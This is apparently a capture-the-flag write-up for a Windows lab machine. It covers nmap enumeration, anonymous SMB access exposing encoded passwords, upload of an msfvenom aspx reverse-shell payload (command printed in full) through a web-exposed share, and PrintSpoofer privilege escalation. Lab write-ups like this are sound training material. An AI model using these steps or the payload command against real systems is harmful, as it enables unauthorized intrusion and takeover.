ENUMERATION:

Nmap all ports scan:

![image](https://user-images.githubusercontent.com/126739122/234123541-eb6ad5df-4058-4fb1-9332-bf923c24e51d.png)

Nmap aggressive scan on open ports:

![image](https://user-images.githubusercontent.com/126739122/234123560-9b18a4ff-91e9-4cd2-9ea3-222d6c14d640.png)

Browsed to http://10.10.15.212 and found the default IIS webpage:

![image](https://user-images.githubusercontent.com/126739122/234123642-cfcf6fea-8e5a-4832-bf38-2074cbe38cb2.png)

Ran gobuster on this webpage for any hidden directories
	- nothing was found with gobuster

Need to perform further enumeration to find some helpful information to get initial access

Checked for any public shared drives with smbclient:

![image](https://user-images.githubusercontent.com/126739122/234123653-a70a6c4b-5517-4f5b-ace1-b53781b9b7bc.png)

Successfully connected to 'nt4wrksv' shared drive anonymously
	- found passwords.txt file
		○ contains 2 base64 encoded strings
		○ decoded both strings and found passwords for both Bob and Bill

![image](https://user-images.githubusercontent.com/126739122/234123664-47d54891-0363-41e4-80c7-57b2c3a29d92.png)

Unable to use these creds for both Bob and Bill to log in via RDP to this machine
INITIAL FOOTHOLD:

Looking back at the aggressive Nmap scan shows that port 49663 is also hosting a webserver
Browsed to http://10.10.15.212:49663 and found the same default IIS webpage as on port 80

Decided to run gobuster on this new webpage
	- found /nt4wrksv directory

Browsed to http://10.10.15.212:49663/nt4wrksv/passwords.txt
	- confirmed this webpage is linked to the 'nt4wrksv' shared drive and can access all those files
	- this allows for a shell.aspx file to be uploaded to this shared drive and spawn a reverse shell

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.47.128 LPORT=6251 -f aspx -o shell.aspx

connected back to 'nt4wrksv' share anonymously and uploaded my shell.aspx file

Browsed to http://10.10.15.212:49663/nt4wrksv/shell.aspx
spawned a fully interactive reverse shell on this web server

PRIVILEGE ESCALATION:

Transferred over winPEASx64.exe from local machine to reverse shell
Ran winPEAS:

![image](https://user-images.githubusercontent.com/126739122/234123682-facf8beb-9604-485a-a5d2-cdf63e3e4946.png)

currently connected to reverse shell as "IIS APPPOOL\DefaultAppPool" user account
This user account has SeImpersonatePrivilege
	- vulnerable to PrintSpoofer exploit for privilege escalation

uploaded PrintSpoofer64.exe file from local machine to reverse shell

![image](https://user-images.githubusercontent.com/126739122/234123691-74b7c9be-71bf-4726-a011-1e4da1aaebf2.png)

FOUND BOTH USER AND ROOT FLAGS
